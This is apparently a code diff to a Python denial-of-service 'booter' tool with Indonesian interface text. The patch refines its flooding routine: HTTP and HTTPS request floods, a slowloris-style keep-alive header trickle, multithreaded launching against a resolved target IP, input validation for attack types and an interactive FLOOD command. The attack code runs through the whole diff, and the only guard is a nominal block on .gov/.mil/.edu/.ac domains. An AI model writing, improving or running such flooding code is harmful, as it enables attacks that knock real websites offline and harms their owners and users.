@@ -13,7 +13,7 @@ from concurrent.futures import ThreadPoolExecutor
 from colorama import Fore
 
 # Setup logging
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
 stop_attack = threading.Event()
@@ -60,9 +60,14 @@ def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet
     try:
         # Wrap socket with SSL for HTTPS
         if protocol == "https":
-            context = ssl.create_default_context()
-            s = context.wrap_socket(s, server_hostname=host)
-            port = port if port != 80 else 443  # Default to 443 for HTTPS
+            try:
+                context = ssl.create_default_context()
+                s = context.wrap_socket(s, server_hostname=host)
+                port = port if port != 80 else 443  # Default to 443 for HTTPS
+            except ssl.SSLError as e:
+                logger.error(f"SSL Error: {e}")
+                attack_stats["errors"] += 1
+                return
 
         headers = generate_random_headers()
         payload_patterns = {
@@ -76,9 +81,9 @@ def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet
             'SLOW': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n" + \
                     ''.join(f"{k}: {v}\r\n" for k, v in headers.items()) + "\r\n",
             'OWN1': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n",
-            # Keep other OWN and TEST payloads as is
         }
         packet_data = payload_patterns.get(data_type_loader_packet, payload_patterns['PY']).encode()
+        logger.debug(f"Connecting to {ip}:{port} with protocol {protocol}")
         s.connect((ip, port))
         s.settimeout(2)
 
@@ -91,8 +96,8 @@ def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet
             s.send(b"\r\n")
             while not stop_attack.is_set():
                 s.send(b"X-a: b\r\nX-b: c\r\n")
-                time.sleep(0.5)  # More aggressive
                 attack_stats["sent"] += 1
+                time.sleep(0.5)
         else:
             # Send multiple requests per connection with keep-alive
             for _ in range(booter_sent):
@@ -100,15 +105,16 @@ def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet
                     break
                 s.sendall(packet_data)
                 attack_stats["sent"] += 1
-                time.sleep(0.01)  # Small delay to avoid overwhelming local resources
+                time.sleep(0.01)
 
     except Exception as e:
         attack_stats["errors"] += 1
-        logger.error(f"Error in attack: {e}")
+        logger.error(f"Error in attack to {ip}:{port}: {e}")
     finally:
         s.close()
 
 def runing_attack(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet, protocol, max_threads):
+    max_threads = min(max_threads, 30)  # Limit to avoid crash
     with ThreadPoolExecutor(max_workers=max_threads) as executor:
         while time.time() < time_loader and not stop_attack.is_set():
             futures = [
@@ -139,6 +145,8 @@ def validate_input(args_get):
             return False, "Semua parameter thread/paket harus positif"
         if protocol not in ["http", "https"]:
             return False, "Protokol harus 'http' atau 'https'"
+        if args_get[1].upper() not in ['PY', 'HEAVY', 'POST', 'SLOW', 'OWN1']:
+            return False, "TYPE_PACKET harus PY, HEAVY, POST, SLOW, atau OWN1"
         return True, ""
     except ValueError:
         return False, "Parameter numerik harus berupa angka"
@@ -179,14 +187,14 @@ def command():
     global stop_attack, attack_stats
     while True:
         try:
-            data_input_loader = input(f"{Fore.CYAN}COMMAND {Fore.WHITE}${Fore.RESET} ")
+            data_input_loader = input(f"{Fore.CYAN}COMMAND {Fore.WHITE}${Fore.RESET} ").strip()
             if not data_input_loader:
                 confirm_exit()
                 continue
-            args_get = data_input_loader.split(" ")
+            args_get = data_input_loader.lstrip('!').split(" ")
             if args_get[0].lower() == "clear":
                 clear_text()
-            elif args_get[0].upper() == "!FLOOD":
+            elif args_get[0].upper() == "FLOOD":
                 valid, error_msg = validate_input(args_get)
                 if not valid:
                     print(f"{Fore.RED}{error_msg}{Fore.RESET}")
@@ -196,11 +204,11 @@ def command():
                 port_loader = int(args_get[3])
                 time_loader = time.time() + int(args_get[4])
                 spam_loader = int(args_get[5])
-                create_thread = min(int(args_get[6]), 50)
+                create_thread = min(int(args_get[6]), 30)
                 booter_sent = int(args_get[7])
                 methods_loader = args_get[8]
-                spam_create_thread = min(int(args_get[9]), 50)
-                max_threads = min(int(args_get[10]), 50)
+                spam_create_thread = min(int(args_get[9]), 30)
+                max_threads = min(int(args_get[10]), 30)
                 protocol = args_get[11].lower()
                 host = ''
                 ip = ''
@@ -210,19 +218,20 @@ def command():
                         print(f"{Fore.GREEN}Uhh You Can't Attack This Website {Fore.WHITE}[ {Fore.YELLOW}.gov .mil .edu .ac {Fore.WHITE}] . . .{Fore.RESET}")
                         continue
                     ip = socket.gethostbyname(host)
-                except socket.gaierror:
-                    print(f"{Fore.YELLOW}FAILED TO GET URL . . .{Fore.RESET}")
+                    logger.debug(f"Resolved {host} to {ip}")
+                except socket.gaierror as e:
+                    print(f"{Fore.YELLOW}FAILED TO GET URL: {e}{Fore.RESET}")
                     continue
                 stop_attack.clear()
                 attack_stats = {"sent": 0, "errors": 0}
-                print(f"{Fore.LIGHTCYAN_EX}Serangan Dimulai\n{Fore.YELLOW}Target: {target_loader}\nPort: {port_loader}\nType: {data_type_loader_packet}\nProtocol: {protocol.upper()}{Fore.RESET}")
+                print(f"{Fore.LIGHTCYAN_EX}Serangan Dimulai\n{Fore.YELLOW}Target: {target_loader}\nIP: {ip}\nPort: {port_loader}\nType: {data_type_loader_packet}\nProtocol: {protocol.upper()}{Fore.RESET}")
                 for _ in range(create_thread):
                     for _ in range(spam_create_thread):
                         threading.Thread(target=runing_attack, args=(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet, protocol, max_threads)).start()
                 countdown_timer(time_loader)
                 continue
             else:
-                print(f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {Fore.RED}{data_input_loader} {Fore.LIGHTRED_EX}Not found command{Fore.RESET}")
+                print(f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {Fore.RED}{args_get[0]} {Fore.LIGHTRED_EX}Not found command{Fore.RESET}")
         except KeyboardInterrupt:
             print(f"\n{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
             stop_attack.set()
